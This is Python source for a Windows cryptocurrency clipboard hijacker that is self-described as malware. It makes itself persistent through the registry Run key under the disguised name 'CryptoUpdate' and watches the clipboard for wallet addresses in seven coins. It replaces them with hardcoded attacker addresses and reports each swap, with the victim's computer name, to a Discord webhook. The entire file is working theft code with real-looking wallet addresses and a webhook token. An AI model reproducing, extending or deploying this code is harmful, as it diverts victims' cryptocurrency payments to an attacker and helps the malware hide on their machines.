import pyperclip
import time
import re
import platform
import subprocess
import win32clipboard
import http.client
import json
import os
import sys
import winreg as reg
import ctypes

# 1Ô∏è‚É£ Define persistence function
def add_to_startup():
    exe_path = sys.executable  # Path of the running malware.exe
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "CryptoUpdate", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)
    except Exception as e:
        pass  # Ignore errors

# 2Ô∏è‚É£ Add malware to startup
add_to_startup()

# 1Ô∏è‚É£ Ignore execution on certain computers
IGNORED_COMPUTERS = ["DESKTOP-TEST", "ADMIN-PC"]
if platform.node() in IGNORED_COMPUTERS:
    exit()

# 2Ô∏è‚É£ Load attacker's crypto addresses (embedded from builder.py)
crypto_addresses = {'BTC': '1LZGrfWxzhN3FSmqrxR6S9mTeoJXwvqx5u', 'ETH': '0x7bD37A6f8aA7aDB3D46e857A12e69B9F70c8d248', 'LTC': 'LNVQxg844RVFGzJ4z6iDU3n7FZN2K1YAbF', 'SOL': '5hkxRAxfsrPhZgBF7vhwqNnERBzJDNnK5jWXLWEEtYVv', 'DOGE': 'D9EbfKwv4UoKLCQbJLj1jUok7WfJczdXXB', 'XRP': 'rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh', 'TRX': 'TAUNfZeqjj8A1ogKfpr2X1eKvgcvB1U7GX'}

# 3Ô∏è‚É£ Discord webhook URL (embedded from builder.py)
webhook_url = "https://discord.com/api/webhooks/1360227151374323822/0swXlSRTd88keb7tdQF0C7CPhDEcKlw04o0oZ6K6T9P-jQTJfELtzc_sfCnoIBTpSKOx"

# 4Ô∏è‚É£ Define regex patterns for multiple crypto types
patterns = {
    "BTC": r"^(1|3|bc1)[A-Za-z0-9]{25,42}$",
    "ETH": r"^0x[a-fA-F0-9]{40}$",
    "LTC": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
    "XMR": r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",
    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{32,44}$",
    "DOGE": r"^D{1}[5-9A-HJ-NP-U]{1}[A-HJ-NP-Za-km-z1-9]{32,34}$",
    "XRP": r"^r[0-9a-zA-Z]{24,34}$",
    "TRX": r"^T[0-9a-zA-Z]{33}$"
}

previous_clipboard = ""

# 5Ô∏è‚É£ Function: Read clipboard using different methods
def get_clipboard():
    """Try multiple methods to read clipboard data."""
    try:
        return pyperclip.paste()  # Method 1: Pyperclip
    except:
        try:
            return subprocess.check_output("powershell Get-Clipboard", shell=True).decode().strip()  # Method 2: Powershell
        except:
            try:
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data  # Method 3: Win32Clipboard
            except:
                try:
                    CF_UNICODETEXT = 13
                    ctypes.windll.user32.OpenClipboard(0)
                    data = ctypes.windll.user32.GetClipboardData(CF_UNICODETEXT)
                    ctypes.windll.user32.CloseClipboard()
                    return data  # Method 4: Ctypes
                except:
                    return ""  # If all fail, return an empty string

# 6Ô∏è‚É£ Function: Set clipboard using different methods
def set_clipboard(content):
    """Try multiple methods to set clipboard data."""
    try:
        pyperclip.copy(content)  # Method 1: Pyperclip
    except:
        try:
            subprocess.run(f"powershell Set-Clipboard -Value '{content}'", shell=True)  # Method 2: Powershell
        except:
            try:
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(content)
                win32clipboard.CloseClipboard()  # Method 3: Win32Clipboard
            except:
                try:
                    CF_UNICODETEXT = 13
                    ctypes.windll.user32.OpenClipboard(0)
                    ctypes.windll.user32.EmptyClipboard()
                    ctypes.windll.user32.SetClipboardData(CF_UNICODETEXT, content)
                    ctypes.windll.user32.CloseClipboard()  # Method 4: Ctypes
                except:
                    pass  # If all fail, do nothing

# 7Ô∏è‚É£ Clipboard monitoring loop
while True:
    clipboard_content = get_clipboard()

    if clipboard_content != previous_clipboard:
        for crypto, pattern in patterns.items():
            if re.match(pattern, clipboard_content):  # Replace Address
                if crypto in crypto_addresses:
                    set_clipboard(crypto_addresses[crypto])  # Replace Address

                    # 8Ô∏è‚É£ Send Discord Webhook Notification if webhook is set
                    if webhook_url:
                        try:
                            conn = http.client.HTTPSConnection("discord.com")
                            headers = {"Content-Type": "application/json"}
                            payload = json.dumps({
                                "content": f"üî¥ **Crypto Address Replaced!**\nüìå **Computer:** {platform.node()}\nüí∞ **{crypto} Address Changed**"
                            })
                            conn.request("POST", webhook_url, body=payload, headers=headers)
                            conn.getresponse()
                        except:
                            pass  # Silently fail if webhook fails

    previous_clipboard = get_clipboard()
    time.sleep(1)